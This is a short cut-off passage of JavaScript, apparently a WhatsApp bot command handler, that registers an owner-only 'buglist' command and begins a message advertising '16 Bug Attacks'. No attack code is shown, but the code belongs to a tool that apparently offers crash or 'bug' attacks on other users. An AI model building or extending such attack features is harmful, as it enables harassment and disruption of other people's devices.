    pattern: "buglist",
    alias: ["bugs", "bug list"],
    desc: "List all 16 bug attacks",
    category: "owner",
    filename: __filename
}, async (conn, mek, m, { reply }) => {
    let text = "💀 *SANUKA-REAL KARIYA 16 Bug Attacks*\n\n";
